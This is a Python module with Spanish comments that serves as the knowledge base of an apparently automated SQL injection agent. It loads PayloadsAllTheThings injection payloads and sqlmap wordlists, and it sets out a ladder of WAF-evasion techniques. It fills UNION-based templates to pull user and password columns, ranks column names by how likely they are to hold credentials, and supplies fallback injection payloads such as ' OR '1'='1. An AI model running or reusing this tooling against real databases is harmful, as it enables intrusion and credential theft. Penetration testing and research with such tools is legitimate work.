"""Base de conocimiento del agente (RAG local, sin nube).

El agente se ALIMENTA de datasets y a la vez GENERA sus payloads rellenando plantillas con el
esquema que descubre. Fuentes reales (todas públicas y citables):
  * `datasets/corpus/`  — 781 payloads de PayloadsAllTheThings (se DISPARAN en la detección).
  * `datasets/wordlists/` — common-columns / common-tables de sqlmap (nombres para el descubrimiento
    ciego cuando information_schema está bloqueado).
  * `datasets/sqli_kb.json` — plantillas de técnicas de extracción (sintaxis MySQL estándar) y la
    escalera de evasión de WAF.
Todo con respaldo determinista: si un dataset falta o está corrupto, se usan valores por defecto
para que el agente siga siendo robusto.

Esto es el diferenciador frente a RADAGAS (que hace RAG en la nube): aquí el conocimiento vive en
archivos locales y se combina con el descubrimiento."""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any

_DATASETS = Path(__file__).resolve().parent.parent / "datasets"

# Escalera de evasión por defecto (respaldo si el dataset no está disponible).
_DEFAULT_LADDER: tuple[tuple[str, ...], ...] = (
    (), ("case",), ("inline_comment",), ("inline_comment", "case"),
    ("union_all", "case"), ("union_all", "inline_comment", "case"),
    ("versioned_comment",), ("versioned_comment", "case"),
    ("term_hash", "inline_comment", "case"), ("whitespace_tab",),
    ("whitespace_newline",), ("whitespace_tab", "case"),
    ("union_all", "versioned_comment", "case"), ("double_keyword",),
    ("double_keyword", "inline_comment", "case"),
)


def _load(name: str) -> dict[str, Any]:
    try:
        return json.loads((_DATASETS / name).read_text(encoding="utf-8"))
    except Exception:
        return {}


def bypass_ladder() -> tuple[tuple[str, ...], ...]:
    """Escalera de pipelines de evasión, leída del dataset (respaldo: la por defecto)."""
    raw = _load("sqli_kb.json").get("waf_bypass_ladder")
    if not raw:
        return _DEFAULT_LADDER
    try:
        return tuple(tuple(step) for step in raw)
    except Exception:
        return _DEFAULT_LADDER


def extraction_techniques() -> dict[str, list[str]]:
    """Plantillas de técnicas de extracción por tipo (union, boolean-blind, time-based, error-based)."""
    return _load("sqli_kb.json").get("extraction_techniques", {})


def technique_names() -> list[str]:
    return list(extraction_techniques().keys())


def fill(template: str, **fields: str) -> str:
    """Rellena una plantilla del dataset con el esquema descubierto, p. ej.
    fill("-1{q} UNION SELECT {ucol},{pcol} FROM {table}-- -", q="'", ucol="user", pcol="password", table="users")."""
    out = template
    for key, value in fields.items():
        out = out.replace("{" + key + "}", str(value))
    return out


# --- Corpus REAL descargado (PayloadsAllTheThings), categorizado por nombre de archivo ---

_CORPUS = _DATASETS / "corpus"
_CATEGORY = {
    "Generic_UnionSelect": "union",
    "Generic_ErrorBased": "error-based",
    "Generic_TimeBased": "time-based",
    "Generic_Fuzz": "detection",
    "SQLi_Polyglots": "detection",
    "patt_auth_bypass": "boolean-blind",
    "Auth_Bypass": "boolean-blind",
    "Auth_Bypass2": "boolean-blind",
    "FUZZDB_MYSQL": "mysql",
}


def corpus() -> dict[str, list[str]]:
    """Carga el corpus real de payloads (datasets/corpus/*.txt), agrupado por técnica."""
    out: dict[str, list[str]] = {}
    if not _CORPUS.is_dir():
        return out
    for path in sorted(_CORPUS.glob("*.txt")):
        category = _CATEGORY.get(path.stem, "other")
        try:
            lines = [ln.strip() for ln in path.read_text(encoding="utf-8", errors="ignore").splitlines() if ln.strip()]
        except Exception:
            lines = []
        out.setdefault(category, []).extend(lines)
    return out


def corpus_size() -> int:
    return sum(len(v) for v in corpus().values())


def detection_payloads(limit: int = 6) -> list[str]:
    """Payloads reales de detección de inyección (fuzz/polyglots) del corpus."""
    det = corpus().get("detection", [])
    # Respaldo: si el corpus no trae categoría 'detection', usa payloads de detección clásicos.
    return (det or ["'", "''", "`", "1'1", "'\"", "' OR '1'='1", "1 AND 1=1", "1 AND 1=2"])[:limit]


def corpus_payloads(technique: str, limit: int = 20) -> list[str]:
    """Payloads reales del corpus para una técnica dada (union, error-based, boolean-blind...)."""
    return corpus().get(technique, [])[:limit]


# --- Wordlists de nombres comunes (sqlmap) para descubrimiento sin information_schema -----------

_WORDLISTS = _DATASETS / "wordlists"
_USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account", "member", "nick")
_PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential", "salt", "auth")


def _load_wordlist(name: str) -> list[str]:
    """Lee una wordlist de sqlmap (ignora líneas de comentario `#` y vacías; dedup sin distinguir
    mayúsculas, conservando el orden del archivo)."""
    path = _WORDLISTS / name
    try:
        raw = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    except Exception:
        return []
    out, seen = [], set()
    for ln in raw:
        w = ln.strip()
        if not w or w.startswith("#"):
            continue
        key = w.lower()
        if key not in seen:
            seen.add(key)
            out.append(w)
    return out


def common_columns() -> list[str]:
    """Nombres de columnas comunes (sqlmap common-columns.txt)."""
    return _load_wordlist("common-columns.txt")


def common_tables() -> list[str]:
    """Nombres de tablas comunes (sqlmap common-tables.txt)."""
    return _load_wordlist("common-tables.txt")


def _prioritize(columns: list[str], hints: tuple[str, ...], cap: int) -> list[str]:
    """Ordena candidatos: coincidencia EXACTA con un hint primero, luego los que lo contienen
    (sin ser un 'id'), hasta `cap`. Así el caso común (user/password) se resuelve en pocos sondeos."""
    exact, partial, seen = [], [], set()
    for c in columns:
        cl = c.lower()
        bucket = exact if cl in hints else (partial if any(h in cl for h in hints) and "id" not in cl else None)
        if bucket is not None and cl not in seen:
            seen.add(cl)
            bucket.append(c)
    return (exact + partial)[:cap]


def credential_column_candidates(cap: int = 120) -> tuple[list[str], list[str]]:
    """(candidatos_usuario, candidatos_password) sacados de la wordlist de sqlmap, priorizados por
    nombres con pinta de credencial. Respaldo: lista mínima si la wordlist no está disponible."""
    cols = common_columns()
    if not cols:
        return (["user", "username", "login", "name", "email"],
                ["password", "pass", "pwd", "passwd", "secret", "hash"])
    return _prioritize(cols, _USER_HINTS, cap), _prioritize(cols, _PASS_HINTS, cap)
